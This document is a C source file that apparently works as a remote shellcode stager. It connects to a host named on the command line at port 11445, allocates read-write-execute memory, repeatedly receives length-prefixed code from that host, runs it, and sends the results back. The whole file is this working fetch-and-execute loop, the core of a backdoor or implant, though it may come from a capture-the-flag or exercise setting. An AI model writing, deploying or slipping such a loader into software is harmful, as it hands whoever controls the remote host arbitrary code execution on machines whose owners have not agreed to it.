#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>

typedef long (*execptr)(char *response, int a);

#define MAX_BUFFER_SIZE 8192

typedef struct VarStruct
{
	unsigned int fd;
		unsigned int Padding;
	unsigned int responselen;
		unsigned int Padding2;
	unsigned long long bufsize;
	char *dataptr;
		unsigned int Padding4;
	unsigned int cursize;
		unsigned int Padding5;
	struct sockaddr_in Addr;
		unsigned int Padding6;
	execptr execdata;
		unsigned int Padding7;
	char response[4096];
		unsigned int Padding8;
} VarStruct;

in_addr_t get_ip(char *hostname)
{
	struct hostent *hosts;
	struct in_addr **addresses;
	 
	hosts = gethostbyname(hostname);
	if (!hosts) 
	{
		// get the host info
		puts("Failed to get ip\n");
		exit(0);
	}

	//return the first entry
	addresses = (struct in_addr **)hosts->h_addr_list;
	return inet_addr(inet_ntoa(*addresses[0]));
}

int main(int argc, char **argv)
{
	struct VarStruct v;

	memset(&v, 0, sizeof(v));

	if(argc != 2)
	{
		puts("Missing address to connect to\n");
		return 0;
	}

	v.execdata = mmap(0, MAX_BUFFER_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	v.dataptr = (char *)v.execdata;
	if((long)v.execdata == -1)
	{
		puts("Unable to mmap memory\n");
		return 0;
	}

	v.fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(v.fd == -1)
	{
		puts("unable to setup socket\n");
		munmap(v.execdata, v.bufsize);
		return 0;
	}

	v.Addr.sin_family = AF_INET;
	v.Addr.sin_port = htons(11445);
	v.Addr.sin_addr.s_addr = get_ip(argv[1]);

	if(connect(v.fd, (struct sockaddr *)&v.Addr, sizeof(v.Addr)) != 0)
	{
		puts("Failed to connect to ");
		puts(argv[1]);
		puts("\n");
		close(v.fd);
		return 0;
	}

	v.bufsize = 0;
	while(1)
	{
		//keep esi/edi from being used due to 64bit losing them
		__asm__(""
			:
			:
			: "esi", "edi"
			);
		//get how many bytes to handle
		v.responselen = recv(v.fd, (char *)&v.bufsize, sizeof(int), 0);
		if(v.responselen <= 0)
		{
			puts("No data received\n");
			return 0;
		}

		//too much data die
		if((v.bufsize < 0) || (v.bufsize > MAX_BUFFER_SIZE))
		{
			puts("Incoming size too large\n");
			return 0;
		}

		//get all the data
		v.cursize = 0;
		while(v.cursize != v.bufsize)
		{
			//get data
			v.responselen = recv(v.fd, &v.dataptr[v.cursize], v.bufsize - v.cursize, 0);
			if(v.responselen <= 0)
			{
				puts("No data received\n");
				return 0;
			}
			
			v.cursize += v.responselen;
		};

		//if error then exit
		if(v.responselen <= 0)
			break;

		//run the received data, respond on it
		v.responselen = v.execdata(v.response, 0);
		if(v.responselen >= 0)
		{
			send(v.fd, &v.responselen, sizeof(int), MSG_MORE);

			//keep esi/edi from being used due to 64bit losing them
			__asm__(""
				:
				:
				: "esi", "edi"
				);
			send(v.fd, &v.response[0], v.responselen, 0);
		}
		else if(v.responselen < 0)
		{
			puts("Error: ");
			puts(v.response);
			return 0;
		}
	};

	printf("Done\n");
	close(v.fd);
	return 0;
}

